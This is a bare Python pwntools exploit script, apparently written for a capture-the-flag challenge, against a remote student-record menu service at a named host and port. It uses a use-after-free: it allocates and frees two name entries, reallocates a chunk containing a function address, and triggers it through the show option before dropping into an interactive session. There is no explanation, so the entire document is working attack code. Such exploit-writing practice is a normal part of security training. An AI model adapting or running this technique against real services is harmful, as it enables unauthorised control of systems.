from pwn import *

def make(length,string) :
    p.sendline("1")
    p.recvuntil("length of name?")
    p.sendline(str(length))
    p.sendline(string)
    p.recvuntil("successfully saved to")
    p.recvuntil("3. remove student\n")

def show(index) :
    p.sendline("2")
    p.recvuntil("number?")
    p.sendline(str(index))
    p.recvuntil("3. remove student\n")

def delete(index) :
    p.sendline("3")
    p.recvuntil("number?")
    p.sendline(str(index))
    p.recvuntil("3. remove student\n")

p = remote("remote.goatskin.kr",50007)
context.log_level = "debug"
p.recvuntil("3. remove student\n")
make(1,"A")
make(1,"A")
delete(1)
delete(0)
address = p32(0x4008a6)
address += "A" * 8
make(16,address)
show(1)
p.interactive()
